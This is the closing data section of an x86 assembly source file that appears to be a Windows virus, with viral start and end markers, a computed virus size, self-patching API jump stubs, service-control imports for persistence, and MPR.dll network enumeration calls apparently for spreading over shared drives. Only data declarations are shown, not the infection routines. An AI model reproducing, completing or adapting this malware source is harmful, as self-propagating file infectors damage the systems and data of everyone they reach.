   RegisterServiceCtrlHandlerA:  db       0B8,?,?,?,?,0FF,0E0,'RegisterServiceCtrlHandlerA',0
   SetServiceStatus:         db           0B8,?,?,?,?,0FF,0E0,'SetServiceStatus',0

   MPR_Name                  db           'MPR.dll',0

   MPR_Functions:

   WNetOpenEnumA:            db           0B8,?,?,?,?,0FF,0E0,'WNetOpenEnumA',0
   WNetEnumResourceA:        db           0B8,?,?,?,?,0FF,0E0,'WNetEnumResourceA',0
   WNetCloseEnum:            db           0B8,?,?,?,?,0FF,0E0,'WNetCloseEnum',0

   VEnd:


   ; ------------------------------------------------------------------------- ;
   ; -------------------------   UNINITIALIZED DATA   ------------------------ ;
   ; ------------------------------------------------------------------------- ;


   Kernel32_Base             dd           ?
   Rand                      dd           ?
   Tick                      dd           ?
   OS                        db           ?


   ALIGN        100


   Buffer1      db           200 dup (0)  ; Current Directory
   Buffer2      db           200 dup (?)  ; Search Buffer
   Buffer3      db          2000 dup (?)  ; Read Buffer


   VSize        equ          offset       VEnd - VStart

   Phys_VSize   equ          1000
   Virt_VSize   equ          4000


   CODE         ENDS

   END          main
